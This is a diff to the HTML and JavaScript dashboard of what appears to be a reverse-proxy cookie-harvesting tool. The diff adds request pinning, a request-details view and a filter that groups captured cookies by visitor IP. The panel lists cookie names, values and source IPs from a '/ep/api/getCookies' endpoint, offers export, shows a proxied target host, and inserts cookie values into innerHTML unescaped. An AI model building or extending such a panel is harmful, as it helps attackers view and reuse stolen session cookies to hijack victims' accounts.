@@ -274,6 +274,27 @@
         padding: 10px;
         border-bottom: 1px solid #2a2a2a;
         font-size: 0.9em;
+        cursor: pointer;
+        transition: background-color 0.2s;
+    }
+
+    .request-item:hover {
+        background-color: #2a2a2a;
+    }
+
+    .request-item.selected {
+        background-color: #3a3a3a;
+    }
+
+    .request-item.pinned {
+        border-left: 3px solid #c50f1f;
+    }
+
+    .request-details {
+        margin-top: 20px;
+        padding: 15px;
+        background: #2a2a2a;
+        border-radius: 8px;
     }
 
     .request-method {
@@ -403,6 +424,9 @@
     <div id="cookies" class="main-content">
         <h2>Cookies</h2>
         <div class="cookie-controls">
+            <select id="ip-filter" class="search-box" onchange="filterCookiesByIP(this.value)">
+                <option value="">All IPs</option>
+            </select>
             <input type="text" class="search-box" placeholder="Search cookies..." onkeyup="filterCookies(this.value)">
             <button class="action-button" onclick="clearCookies()">Clear Cookies</button>
             <button class="action-button" onclick="exportCookies()">Export</button>
@@ -417,6 +441,14 @@
             <button class="action-button" onclick="clearHistory()">Clear History</button>
         </div>
         <div class="request-list" id="request-list"></div>
+        <div id="request-details" class="request-details" style="display: none;">
+            <h3>Request Details</h3>
+            <div id="request-info"></div>
+            <div class="request-actions">
+                <button onclick="pinRequest()" class="action-button">Pin</button>
+                <button onclick="removeRequest()" class="action-button">Remove</button>
+            </div>
+        </div>
     </div>
 
     <div id="settings" class="main-content">
@@ -498,9 +530,10 @@
             const response = await fetch('/ep/api/serverInfo');
             const data = await response.json();
             
-            document.getElementById('server-target').textContent = data.target;
-            document.getElementById('server-host').textContent = data.host;
-            document.getElementById('server-port').textContent = data.port;
+            document.getElementById('server-target').textContent = data.target || 'N/A';
+            document.getElementById('server-host').textContent = data.host || 'N/A';
+            document.getElementById('server-port').textContent = data.port || 'N/A';
+            document.getElementById('current-path').textContent = window.location.pathname;
         } catch (error) {
             console.error('Error fetching server info:', error);
         }
@@ -629,11 +662,24 @@
             .then(requests => {
                 const requestList = document.getElementById('request-list');
                 requestList.innerHTML = '';
-                requests.forEach(req => {
+                
+                // Show pinned requests first
+                const sortedRequests = requests.sort((a, b) => {
+                    if (pinnedRequests.has(a.timestamp) && !pinnedRequests.has(b.timestamp)) return -1;
+                    if (!pinnedRequests.has(a.timestamp) && pinnedRequests.has(b.timestamp)) return 1;
+                    return 0;
+                });
+
+                sortedRequests.forEach(req => {
                     const item = document.createElement('div');
                     item.className = 'request-item';
+                    if (pinnedRequests.has(req.timestamp)) {
+                        item.classList.add('pinned');
+                    }
+                    
                     const methodClass = `method-${req.method}`;
                     const statusClass = `status-${Math.floor(req.status_code/100)}xx`;
+                    
                     item.innerHTML = `
                         <span>
                             <span class="request-method ${methodClass}">${req.method}</span>
@@ -644,7 +690,109 @@
                             <span>${new Date(req.timestamp).toLocaleTimeString()}</span>
                         </span>
                     `;
+                    
+                    item.onclick = () => showRequestDetails(req);
                     requestList.appendChild(item);
+                });
+            });
+    }
+
+    function showRequestDetails(request) {
+        selectedRequest = request;
+        document.querySelectorAll('.request-item').forEach(item => item.classList.remove('selected'));
+        event.currentTarget.classList.add('selected');
+        
+        const details = document.getElementById('request-details');
+        details.style.display = 'block';
+        
+        document.getElementById('request-info').innerHTML = `
+            <p><strong>Method:</strong> ${request.method}</p>
+            <p><strong>Path:</strong> ${request.path}</p>
+            <p><strong>Status:</strong> ${request.status_code}</p>
+            <p><strong>IP:</strong> ${request.ip}</p>
+            <p><strong>Time:</strong> ${new Date(request.timestamp).toLocaleString()}</p>
+        `;
+    }
+
+    function pinRequest() {
+        if (selectedRequest) {
+            if (pinnedRequests.has(selectedRequest.timestamp)) {
+                pinnedRequests.delete(selectedRequest.timestamp);
+            } else {
+                pinnedRequests.add(selectedRequest.timestamp);
+            }
+            updateRequestList();
+        }
+    }
+
+    function removeRequest() {
+        if (selectedRequest) {
+            fetch('/ep/api/removeRequest', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ timestamp: selectedRequest.timestamp })
+            }).then(() => {
+                updateRequestList();
+                document.getElementById('request-details').style.display = 'none';
+            });
+        }
+    }
+
+    function updateIPFilter(cookies) {
+        const ipFilter = document.getElementById('ip-filter');
+        const ips = new Set(cookies.map(cookie => cookie.ip));
+        
+        // Keep the current selection
+        const currentSelection = ipFilter.value;
+        
+        // Update options
+        ipFilter.innerHTML = '<option value="">All IPs</option>';
+        ips.forEach(ip => {
+            const option = document.createElement('option');
+            option.value = ip;
+            option.textContent = ip;
+            ipFilter.appendChild(option);
+        });
+        
+        // Restore selection if it still exists
+        if (ips.has(currentSelection)) {
+            ipFilter.value = currentSelection;
+        }
+    }
+
+    function filterCookiesByIP(ip) {
+        const cookies = document.querySelectorAll('.cookie-card');
+        cookies.forEach(cookie => {
+            if (!ip || cookie.dataset.ip === ip) {
+                cookie.style.display = '';
+            } else {
+                cookie.style.display = 'none';
+            }
+        });
+    }
+
+    function fetchCookies() {
+        fetch('/ep/api/getCookies')
+            .then(response => response.json())
+            .then(cookies => {
+                const cookieGrid = document.getElementById('cookie-grid');
+                cookieGrid.innerHTML = '';
+                
+                updateIPFilter(cookies);
+                
+                cookies.forEach(cookie => {
+                    const card = document.createElement('div');
+                    card.className = 'cookie-card';
+                    card.dataset.ip = cookie.ip;
+                    card.innerHTML = `
+                        <h3>${cookie.name}</h3>
+                        <p class="cookie-value">${cookie.value}</p>
+                        <p class="cookie-info">${cookie.timestamp}</p>
+                        <p class="cookie-info">IP: ${cookie.ip}</p>
+                    `;
+                    cookieGrid.appendChild(card);
                 });
             });
     }
@@ -652,11 +800,10 @@
     // Initialize
     window.onload = function() {
         showSection('home');
-        document.getElementById('current-path').textContent = window.location.pathname;
+        fetchServerInfo();  // This should now work properly
         fetchCookies();
-        fetchServerInfo();
         updateRequestList();
-        setInterval(updateRequestList, 5000); // Update every 5 seconds
+        setInterval(updateRequestList, 5000);
     };
 </script>
 
